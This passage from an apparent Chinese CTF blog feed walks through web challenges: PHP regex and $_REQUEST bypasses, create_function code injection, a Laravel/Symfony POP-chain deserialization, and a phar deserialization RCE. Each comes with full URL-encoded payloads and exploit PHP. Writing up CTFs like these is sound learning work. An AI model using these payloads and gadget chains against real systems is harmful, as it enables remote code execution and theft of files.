$_GET[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; $_GET[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123;        $file = $_GET[<span class="hljs-string">&quot;file&quot;</span>];        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;    &#125;&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</code></pre><p><code>^</code> 匹配起始、<code>$</code> 匹配结束，<code>preg_match</code>值匹配第一行，在句尾加上<code>%0a</code>即可绕过</p><h5 id="绕过-REQUEST-的字母匹配"><a class="header-anchor" href="#绕过-REQUEST-的字母匹配">🍭</a>绕过 $_REQUEST 的字母匹配</h5><pre><code class="hljs php"><span class="hljs-keyword">if</span>($_REQUEST) &#123;    <span class="hljs-keyword">foreach</span>($_REQUEST <span class="hljs-keyword">as</span> $value) &#123;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, $value))            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>);    &#125;&#125;</code></pre><p><code>foreach</code> 循环遍历 <code>$_REQUEST</code> 数组，将键值赋给 <code>$value</code>，然后检测 <code>$value</code> 是否包含字母，若是 则 <code>die()</code>。</p><p><code>$_REQUEST</code>同时接受GET和POST的数据，并且POST具有更高的优先值(默认的优先级 ENV&lt;GET&lt;POST&lt;COOKIE&lt;SERVER)。同时GET和POST同一个参数就可以绕过.</p><h5 id="绕过文件内容读取的比较"><a class="header-anchor" href="#绕过文件内容读取的比较">🍭</a>绕过文件内容读取的比较</h5><pre><code class="hljs lisp">if (<span class="hljs-name">file_get_contents</span>($file) !== &#x27;y1ng_YuZhou_Wudi_zuishuai&#x27;)    die(&#x27; Am not I universe wudi zuishuai?&lt;br&gt;&#x27;)<span class="hljs-comment">;</span></code></pre><ul><li><p><code>php://input</code></p><p>将post过来的数据全部当做文件内容</p></li><li><p>data://</p></li><li><p><code>data://text/plain,&lt;?php phpinfo()?&gt;</code></p><ul><li><code>data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></li></ul></li></ul><h5 id="绕过sha1比较"><a class="header-anchor" href="#绕过sha1比较">🍭</a>绕过sha1比较</h5><pre><code class="hljs smalltalk">if ( sha1(<span class="hljs-string">$s</span>hana) === sha1(<span class="hljs-string">$p</span>asswd) &amp;&amp; <span class="hljs-string">$s</span>hana != <span class="hljs-string">$p</span>asswd )&#123;    extract(<span class="hljs-string">$_</span>GET[<span class="hljs-comment">&quot;flag&quot;</span>]);    echo <span class="hljs-comment">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;&#125; else&#123;    die(<span class="hljs-comment">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);&#125;</code></pre><p>如果<code>sha1()</code>的参数为数组，将会返回false，所以<code>sha1(Array(xxx))==sha1(Array(yyy)))</code></p><p>payload:</p><pre><code class="hljs angelscript">/<span class="hljs-number">1</span>nD3x.php?file=%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">2f</span>%<span class="hljs-number">2f</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">2f</span>%<span class="hljs-number">70</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>%<span class="hljs-number">5f</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>%<span class="hljs-number">5f</span>%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>&amp;%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>=%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5f</span>%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">5f</span>%<span class="hljs-number">63</span>%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">0</span>A&amp;%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>[]=<span class="hljs-number">1</span>&amp;%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">77</span>%<span class="hljs-number">64</span>[]=<span class="hljs-number">2</span></code></pre><h5 id="create-function-代码注入"><a class="header-anchor" href="#create-function-代码注入">🍭</a>create_function()代码注入</h5><pre><code class="hljs gherkin">if(preg_match(&#x27;/^[a-z0-9]<span class="hljs-symbol">*</span>$/isD&#x27;, $code) ||    preg_match(&#x27;/fil|<span class="hljs-string">cat</span>|<span class="hljs-string">more</span>|<span class="hljs-string">tail</span>|<span class="hljs-string">tac</span>|<span class="hljs-string">less</span>|<span class="hljs-string">head</span>|<span class="hljs-string">nl</span>|<span class="hljs-string">tailf</span>|<span class="hljs-string">ass</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">sort</span>|<span class="hljs-string">shell</span>|<span class="hljs-string">ob</span>|<span class="hljs-string">start</span>|<span class="hljs-string">mail</span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">x</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\</span>||<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">sou</span>|<span class="hljs-string">show</span>|<span class="hljs-string">cont</span>|<span class="hljs-string">high</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">scan</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">local</span>|<span class="hljs-string">sess</span>|<span class="hljs-string">id</span>|<span class="hljs-string">source</span>|<span class="hljs-string">arra</span>|<span class="hljs-string">head</span>|<span class="hljs-string">light</span>|<span class="hljs-string">print</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">read</span>|<span class="hljs-string">inc</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">1f</span>|<span class="hljs-string">info</span>|<span class="hljs-string">bin</span>|<span class="hljs-string">hex</span>|<span class="hljs-string">oct</span>|<span class="hljs-string">pi</span>|<span class="hljs-string">con</span>|<span class="hljs-string">rot</span>|<span class="hljs-string">input</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">log</span>|<span class="hljs-string">\^/i&#x27;, $arg) ) &#123;</span><span class="hljs-string">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;);</span><span class="hljs-string">&#125; else &#123;</span><span class="hljs-string">    include &quot;flag.php&quot;;</span><span class="hljs-string">    $code(&#x27;&#x27;, $arg);</span><span class="hljs-string">&#125;</span></code></pre><p>create_function()</p><pre><code class="hljs nsis"><span class="hljs-variable">$myfunc</span> = create_function(<span class="hljs-string">&#x27;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>&#x27;</span>, <span class="hljs-string">&#x27;return <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;&#x27;</span>)<span class="hljs-comment">;</span></code></pre><p>==&gt;</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myfunc</span>(<span class="hljs-params">$a, $b</span>)</span>&#123;    <span class="hljs-keyword">return</span> $a+$b;&#125;</code></pre><p>因为第二个参数没有限制，<code>$code=return $a+$b;&#125;eval($_POST['cmd']);//</code>==&gt;</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myfunc</span>(<span class="hljs-params">$a, $b</span>)</span>&#123;<span class="hljs-keyword">return</span> $a+$b;&#125;<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-comment">//&#125;</span></code></pre><p>可执行任意代码。在上一阶段的extract($_GET[“flag”]);处进行变量覆盖，从而使变量$code和变量$arg可控<br>首先闭合原有的语句：<code>flag[arg]=&#125;</code>，函数基本被禁用，此时可以使用使用get_defined_vars()将所有变量与值都进行输出，构造payload：</p><p><code>flag[arg]=&#125;var_dump(get_defined_vars());//&amp;flag[code]=create_function</code></p><p>等价于</p><pre><code class="hljs delphi"><span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-comment">&#123;</span></span><span class="hljs-function"><span class="hljs-comment">&#125;</span></span><span class="hljs-function"><span class="hljs-title">var_dump</span><span class="hljs-params">(get_defined_vars()</span>);</span><span class="hljs-comment">//&#125;</span></code></pre><p>url编码</p><pre><code class="hljs xquery">?<span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75</span>=<span class="hljs-meta">%61</span><span class="hljs-meta">%71</span><span class="hljs-meta">%75</span><span class="hljs-meta">%61_is_</span><span class="hljs-meta">%63</span><span class="hljs-meta">%75</span><span class="hljs-meta">%74</span><span class="hljs-meta">%65</span><span class="hljs-meta">%0A</span>&amp;file=data://<span class="hljs-type">text</span>/plain,<span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75_</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75_</span><span class="hljs-meta">%61</span><span class="hljs-meta">%71</span><span class="hljs-meta">%75</span><span class="hljs-meta">%61</span>&amp;<span class="hljs-meta">%73</span><span class="hljs-meta">%68</span><span class="hljs-meta">%61</span><span class="hljs-meta">%6e</span><span class="hljs-meta">%61</span>[]=<span class="hljs-number">1</span>&amp;<span class="hljs-meta">%70</span><span class="hljs-meta">%61</span><span class="hljs-meta">%73</span><span class="hljs-meta">%73</span><span class="hljs-meta">%77</span><span class="hljs-meta">%64</span>[]=<span class="hljs-number">2</span>&amp;<span class="hljs-meta">%66</span><span class="hljs-meta">%6c</span><span class="hljs-meta">%61</span><span class="hljs-meta">%67</span>[<span class="hljs-meta">%61</span><span class="hljs-meta">%72</span><span class="hljs-meta">%67</span>]=&#125;var_dump(get_defined_vars());//&amp;<span class="hljs-meta">%66</span><span class="hljs-meta">%6c</span><span class="hljs-meta">%61</span><span class="hljs-meta">%67</span>[<span class="hljs-meta">%63</span><span class="hljs-meta">%6f</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span>]=create_function</code></pre><p><img src="/2021/08/04/ez/2.png" alt="2"></p><p>flag在<code>rea1fl4g.php</code>中，</p><p>过滤了 include 还能用 require，过滤了引号，可以使用那些参数可以不加引号的函数，require() 代替 require<br>&quot; &quot;：<code>require(php://filter/read=convert.base64- encode/resource=rea1fl4g.php);// </code></p><p>过滤了 flag，限制了许多符号，使用base64编码方式绕过：</p><pre><code class="hljs xquery">flag[arg]=&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//&amp;flag[code]=create_function?<span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75</span>=<span class="hljs-meta">%61</span><span class="hljs-meta">%71</span><span class="hljs-meta">%75</span><span class="hljs-meta">%61_is_</span><span class="hljs-meta">%63</span><span class="hljs-meta">%75</span><span class="hljs-meta">%74</span><span class="hljs-meta">%65</span><span class="hljs-meta">%0A</span>&amp;file=data://<span class="hljs-type">text</span>/plain,<span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75_</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75_</span><span class="hljs-meta">%61</span><span class="hljs-meta">%71</span><span class="hljs-meta">%75</span><span class="hljs-meta">%61</span>&amp;<span class="hljs-meta">%73</span><span class="hljs-meta">%68</span><span class="hljs-meta">%61</span><span class="hljs-meta">%6e</span><span class="hljs-meta">%61</span>[]=<span class="hljs-number">1</span>&amp;<span class="hljs-meta">%70</span><span class="hljs-meta">%61</span><span class="hljs-meta">%73</span><span class="hljs-meta">%73</span><span class="hljs-meta">%77</span><span class="hljs-meta">%64</span>[]=<span class="hljs-number">2</span>&amp;<span class="hljs-meta">%66</span><span class="hljs-meta">%6c</span><span class="hljs-meta">%61</span><span class="hljs-meta">%67</span>[<span class="hljs-meta">%61</span><span class="hljs-meta">%72</span><span class="hljs-meta">%67</span>]=&#125;;require(<span class="hljs-meta">%62</span><span class="hljs-meta">%61</span><span class="hljs-meta">%73</span><span class="hljs-meta">%65</span><span class="hljs-meta">%36</span><span class="hljs-meta">%34_</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%63</span><span class="hljs-meta">%6f</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span>(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//&amp;<span class="hljs-meta">%66</span><span class="hljs-meta">%6c</span><span class="hljs-meta">%61</span><span class="hljs-meta">%67</span>[<span class="hljs-meta">%63</span><span class="hljs-meta">%6f</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span>]=create_function</code></pre><p>得到个假的</p><img src="/2021/08/04/ez/3.png" alt="3" style="zoom:67%;"><p>使用<code>~</code>取反绕过，最终payload：</p><p>利用 <code>require()</code> 本地文件包含 + 用伪协议读源码</p><pre><code class="hljs xquery">?debu=aqua_is_cute<span class="hljs-meta">%0a</span>&amp;file=data://<span class="hljs-type">text</span>/plain,debu_debu_aqua&amp;shana[]=<span class="hljs-number">1</span>&amp;passwd[]=<span class="hljs-number">2</span>&amp;flag[arg]=&#125;;require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);var_dump(get_defined_vars());//&amp;flag[code]=create_function?<span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75</span>=<span class="hljs-meta">%61</span><span class="hljs-meta">%71</span><span class="hljs-meta">%75</span><span class="hljs-meta">%61_is_</span><span class="hljs-meta">%63</span><span class="hljs-meta">%75</span><span class="hljs-meta">%74</span><span class="hljs-meta">%65</span><span class="hljs-meta">%0A</span>&amp;file=data://<span class="hljs-type">text</span>/plain,<span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75_</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span><span class="hljs-meta">%62</span><span class="hljs-meta">%75_</span><span class="hljs-meta">%61</span><span class="hljs-meta">%71</span><span class="hljs-meta">%75</span><span class="hljs-meta">%61</span>&amp;<span class="hljs-meta">%73</span><span class="hljs-meta">%68</span><span class="hljs-meta">%61</span><span class="hljs-meta">%6e</span><span class="hljs-meta">%61</span>[]=<span class="hljs-number">1</span>&amp;<span class="hljs-meta">%70</span><span class="hljs-meta">%61</span><span class="hljs-meta">%73</span><span class="hljs-meta">%73</span><span class="hljs-meta">%77</span><span class="hljs-meta">%64</span>[]=<span class="hljs-number">2</span>&amp;<span class="hljs-meta">%66</span><span class="hljs-meta">%6c</span><span class="hljs-meta">%61</span><span class="hljs-meta">%67</span>[<span class="hljs-meta">%61</span><span class="hljs-meta">%72</span><span class="hljs-meta">%67</span>]=;&#125;require(~(<span class="hljs-meta">%8f</span><span class="hljs-meta">%97</span><span class="hljs-meta">%8f</span><span class="hljs-meta">%c5</span><span class="hljs-meta">%d0</span><span class="hljs-meta">%d0</span><span class="hljs-meta">%99</span><span class="hljs-meta">%96</span><span class="hljs-meta">%93</span><span class="hljs-meta">%8b</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%d0</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%9e</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%c2</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%90</span><span class="hljs-meta">%91</span><span class="hljs-meta">%89</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%8b</span><span class="hljs-meta">%d1</span><span class="hljs-meta">%9d</span><span class="hljs-meta">%9e</span><span class="hljs-meta">%8c</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%c9</span><span class="hljs-meta">%cb</span><span class="hljs-meta">%d2</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%91</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%90</span><span class="hljs-meta">%9b</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%d0</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%8c</span><span class="hljs-meta">%90</span><span class="hljs-meta">%8a</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9c</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%c2</span><span class="hljs-meta">%8d</span><span class="hljs-meta">%9a</span><span class="hljs-meta">%9e</span><span class="hljs-meta">%ce</span><span class="hljs-meta">%99</span><span class="hljs-meta">%93</span><span class="hljs-meta">%cb</span><span class="hljs-meta">%98</span><span class="hljs-meta">%d1</span><span class="hljs-meta">%8f</span><span class="hljs-meta">%97</span><span class="hljs-meta">%8f</span>));//&amp;<span class="hljs-meta">%66</span><span class="hljs-meta">%6c</span><span class="hljs-meta">%61</span><span class="hljs-meta">%67</span>[<span class="hljs-meta">%63</span><span class="hljs-meta">%6f</span><span class="hljs-meta">%64</span><span class="hljs-meta">%65</span>]=create_function</code></pre><p><img src="/2021/08/04/ez/4.png" alt="4"></p><p>解码得到flag。</p><h2 id="总结"><a class="header-anchor" href="#总结">🍭</a>总结</h2><p>坑点1：使用<code>require(base64_decode(cmVhMWZsNGcucGhw));</code>得到假的flag，需要取反绕过的原因：</p><p><img src="/2021/08/04/ez/5.png" alt="5"></p><p>最后结果解码后可以看到文件中把<code>$rea1_f1114g</code>给unset了，</p><p><img src="/2021/08/04/ez/7.png" alt="7"></p><p>因此不能直接得到flag变量。</p><p>坑点2：</p><p>绕过request时需要POST,GET同时传参，其余的数组却不用，因为数组输出的 <code>$value</code> 为 Array，并没有被正则表达式匹配。这是因为 <code>preg_match()</code> 只能匹配字符串，数组得以绕过。</p><p>坑点3：</p><p>还是在绕过request的时候，一直绕不过去，我以为是payload构造错了，然后就翻遍了各种wp，结果都不行，我还试了全编码，都不行，我还换个浏览器一样不行，最后想到优先级cookie比较高，找了一下发现</p><p><img src="/2021/08/04/ez/6.png" alt="6"></p><p>cookie里储存着之前题目的值。。。。。。删掉就可以了。</p><p>参考：<a href="https://www.gem-love.com/ctf/770.html">https://www.gem-love.com/ctf/770.html</a></p>]]></content>
    
    
    <categories>
      
      <category>create_function代码注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu（五）</title>
    <link href="/2021/08/02/tiny/"/>
    <url>/2021/08/02/tiny/</url>
    
    <content type="html"><![CDATA[<h1>CISCN2019 总决赛 Day1 Web4]Laravel1</h1><p>laravel框架，题目提供源码，还是要找POP链，还是先搜<code>_destruct()</code>去找一个反序列化的点，搜索出的destruct有很多，需要一个个跟进判断可不可以利用，文件太大，我并没有找到，参考大佬的<a href="https://xz.aliyun.com/t/5816#toc-3">wp</a>，找出TagAwareAdapter类：</p><p><img src="/2021/08/02/tiny/13.png" alt="13"></p><p><code>__destruct</code>方法调用commit()，commit()又调用<code>invalidateTags([])</code>，跟进invalidateTags方法：</p><img src="/2021/08/02/tiny/14.png" alt="14" style="zoom:80%;"><p>这里<code>$this-&gt;pool</code>是可控的，所以我们需要找一个类中有saveDeferred方法的类，找到一个PhpArrayAdapter类：</p><p><img src="/2021/08/02/tiny/15.png" alt="15"></p><p>跟进initialize这个方法，发现在本类中并没有定义，得去找父类，PhpArrayAdapter类的继承关系：</p><p><img src="/2021/08/02/tiny/16.png" alt="16"></p><p>父类的initialize方法：</p><img src="/2021/08/02/tiny/17.png" alt="17" style="zoom:80%;"><p>在PhpArrayAdapter中定义好<code>$this-&gt;file</code>这个变量，那么在调用initialize方法的时候，只要这个file是一个存在的文件，就会调用include来包含进去，最后就可以读取到flag了</p><p>payload：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">Cache</span>&#123;    <span class="hljs-title">final</span> <span class="hljs-title">class</span> <span class="hljs-title">CacheItem</span>&#123;    &#125;&#125;<span class="hljs-title">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">Cache</span>\<span class="hljs-title">Adapter</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">Cache</span>\<span class="hljs-title">CacheItem</span>;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PhpArrayAdapter</span></span>&#123;        <span class="hljs-keyword">private</span> $file=<span class="hljs-string">&#x27;/flag&#x27;</span>;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TagAwareAdapter</span></span>&#123;        <span class="hljs-keyword">private</span> $deferred;        <span class="hljs-keyword">private</span> $pool;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;deferred = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;xxx&#x27;</span> =&gt; <span class="hljs-keyword">new</span> CacheItem());            <span class="hljs-keyword">$this</span>-&gt;pool = <span class="hljs-keyword">new</span> PhpArrayAdapter();        &#125;    &#125;$a=<span class="hljs-keyword">new</span> TagAwareAdapter();<span class="hljs-keyword">echo</span> urlencode(serialize($a));&#125;<span class="hljs-meta">?&gt;</span><span class="hljs-comment">#这两个类都是在Symfony\Component\Cache\Adapter命名空间下的</span><span class="hljs-comment">#而Cacheitem类则不在同一个类下。所以我们得新建一个命名空间。并且use导入</span></code></pre><p>参考：<a href="https://xz.aliyun.com/t/5816#toc-6">https://xz.aliyun.com/t/5816#toc-6</a></p><h1>[HFCTF 2021 Final]tinypng</h1><p>查看源码，还是laravel框架，先去看看路由和控制器<img src="/2021/08/02/tiny/5.png" alt="5"></p><p>api下有个user路由暂时没什么用，看web的：</p><p><img src="/2021/08/02/tiny/6.png" alt="6"></p><p>index路由指向IndexController的fileUpload方法，image路由指向ImageController的handle方法。</p><p>IndexController：</p><p><img src="/2021/08/02/tiny/7.png" alt="7"></p><p><code>fileupload</code>能上传文件，但文件名由MD5(time())随机生成，文件类型不可控，只能为png，文件大小也有要求，不过影响不大。且内容不能有<code>&lt;?| php|HALT_COMPILER</code>。</p><p>ImageController：</p><p><img src="/2021/08/02/tiny/8.png" alt="8"></p><blockquote><p>explode()</p><p>把字符串打散为数组</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">explode</span><span class="hljs-params">(separator,string,limit)</span></span></code></pre><table><thead><tr><th>separator</th><th>必需。规定在哪里分割字符串。</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。要分割的字符串。</td></tr><tr><td><em>limit</em></td><td>可选。规定所返回的数组元素的数目。 可能的值：  大于 0 - 返回包含最多 <em>limit</em> 个元素的数组 小于 0 - 返回包含除了最后的 -<em>limit</em> 个元素以外的所有元素的数组 0 - 返回包含一个元素的数组</td></tr></tbody></table></blockquote><p>ImageController方法接收了一个参数image然后explode取后缀，要求必须为png；然后把<code>$source</code>传入imgcompress：</p><p><img src="/2021/08/02/tiny/9.png" alt="9"></p><p><code>$this-&gt;src</code>就是我们传入的<code>$source</code>，只是后缀不可控，然后调用了compressImg，跟进_openImage()：</p><p><img src="/2021/08/02/tiny/10.png" alt="10"></p><p>到这思路就清晰了，<code>$this-&gt;src</code>可控，上传一个phar文件通过<code>getimagesize()</code>触发phar反序列化就可用rce了。</p><p>exp：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">Routing</span>\<span class="hljs-title">Loader</span>\<span class="hljs-title">Configurator</span>&#123;<span class="hljs-title">class</span> <span class="hljs-title">ImportConfigurator</span>&#123;<span class="hljs-title">private</span> $<span class="hljs-title">parent</span>;<span class="hljs-keyword">private</span> $route;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$class</span>)</span>&#123;<span class="hljs-keyword">$this</span>-&gt;parent=$class;<span class="hljs-keyword">$this</span>-&gt;route=<span class="hljs-string">&#x27;test&#x27;</span>;&#125;&#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">Mockery</span>&#123;<span class="hljs-title">class</span> <span class="hljs-title">HigherOrderMessage</span>&#123;<span class="hljs-title">private</span> $<span class="hljs-title">mock</span>;<span class="hljs-keyword">private</span> $method;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$class</span>)</span>&#123;<span class="hljs-keyword">$this</span>-&gt;mock=$class;<span class="hljs-keyword">$this</span>-&gt;method=<span class="hljs-string">&#x27;generate&#x27;</span>;&#125;&#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">PHPUnit</span>\<span class="hljs-title">Framework</span>\<span class="hljs-title">MockObject</span>&#123;<span class="hljs-title">final</span> <span class="hljs-title">class</span> <span class="hljs-title">MockTrait</span>&#123;<span class="hljs-title">private</span> $<span class="hljs-title">mockName</span>;<span class="hljs-keyword">private</span> $classCode;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">$this</span>-&gt;mockName=<span class="hljs-string">&#x27;123&#x27;</span>;<span class="hljs-keyword">$this</span>-&gt;classCode=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;&#125;&#125;&#125;<span class="hljs-keyword">namespace</span>&#123;<span class="hljs-title">use</span> \<span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">Routing</span>\<span class="hljs-title">Loader</span>\<span class="hljs-title">Configurator</span>\<span class="hljs-title">ImportConfigurator</span>;<span class="hljs-keyword">use</span> \<span class="hljs-title">Mockery</span>\<span class="hljs-title">HigherOrderMessage</span>;<span class="hljs-keyword">use</span> \<span class="hljs-title">PHPUnit</span>\<span class="hljs-title">Framework</span>\<span class="hljs-title">MockObject</span>\<span class="hljs-title">MockTrait</span>;$c=<span class="hljs-keyword">new</span> MockTrait();$b=<span class="hljs-keyword">new</span> HigherOrderMessage($c);$a=<span class="hljs-keyword">new</span> ImportConfigurator($b);@unlink(<span class="hljs-string">&quot;phar.phar&quot;</span>);$phar=<span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>);$phar-&gt;startBuffering(); $phar-&gt;setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&quot;__HALT_COMPILER();&quot;</span>); $phar-&gt;setMetadata($a); $phar-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);$phar-&gt;stopBuffering();&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>exp可以在phpggc的Laravel下找到，可用exp生成，也可以phpggc一把梭，还要绕过之前的限制</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/&lt;\?|php|HALT\_COMPILER/i&quot;</span>, $content ))&#123;    $error = <span class="hljs-string">&#x27;Don\&#x27;t do that, please&#x27;</span>;    <span class="hljs-keyword">return</span> back()&#125;</code></pre><p>用<code>gzip</code>或者<code>bzip2</code>压缩的方式绕过即可</p><p><img src="/2021/08/02/tiny/12.png" alt="12"></p><p>上传，抓包，修改文件类型，会得到文件名，在源码中通过uploads可以找到文件上传后储存的地方：\html\storage\app\uploads，所以我们在image路由传<code>phar://../storage/app/uploads/xxxxxxxxxxx.png</code></p><p><img src="/2021/08/02/tiny/2.png" alt="2"></p><p>改一下命令，再传一个：</p><p><img src="/2021/08/02/tiny/3.png" alt="3"></p><p>参考：<a href="https://www.anquanke.com/post/id/239993#h2-4">https://www.anquanke.com/post/id/239993#h2-4</a></p>]]></content>
    
    
    <categories>
      
      <category>phar反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Laravel框架</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>REGEXP注入与LIKE注入</title>
    <link href="/2021/08/01/regexp/"/>
    <url>/2021/08/01/regexp/</url>
    
